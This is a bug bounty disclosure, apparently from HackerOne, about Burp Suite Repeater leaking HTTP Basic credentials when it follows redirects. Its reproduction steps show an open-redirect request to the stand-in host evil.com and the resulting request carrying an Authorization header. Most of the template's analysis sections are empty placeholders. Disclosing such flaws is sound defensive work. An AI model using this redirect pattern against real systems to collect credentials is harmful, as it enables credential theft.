# Leak of Platform Authentication credentials via Repeater

## Metadata
- **Source:** HackerOne
- **Report:** 302651 | https://hackerone.com/reports/302651
- **Submitted:** 2018-01-05
- **Reporter:** jupenur
- **Program:** Unknown
- **Bounty:** $200
- **Severity:** low
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
Burp Repeater leaks Platform Authentication (HTTP Basic) credentials when following redirections.

Steps to reproduce:

- Set up an open redirection on a site you control (`example.com`).
- Set up Platform Authentication for that same site. Use HTTP Basic auth and whatever credentials.
- Using Repeater, issue a request to the page with the open redirection:

```
GET /redirect.php?url=http://evil.c

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Burp Repeater leaks Platform Authentication (HTTP Basic) credentials when following redirections.

Steps to reproduce:

- Set up an open redirection on a site you control (`example.com`).
- Set up Platform Authentication for that same site. Use HTTP Basic auth and whatever credentials.
- Using Repeater, issue a request to the page with the open redirection:

```
GET /redirect.php?url=http://evil.com HTTP/1.1
Host: example.com

 
```

- Click on the `Follow redirection` button
- Observe, helpless, as your HTTP Basic credentials are sent to `evil.com`:

```
GET http://evil.com/ HTTP/1.1
Host: evil.com
Authorization: Basic dXNlcjpwYXNz


```

Note that there's nothing "unusual" about the steps to reproduce this, so it can easily happen completely by accident. On the attacker's side, exploiting this only requires logging any incoming `Authorization` headers.

## Impact

Burp Suite users may inadvertently send Platform Authentication credentials to unrelated third parties. This is fundamentally very sensitive information, making this a rather nasty leak.

</details>

---
*Analysed by Claude on 2026-05-24*
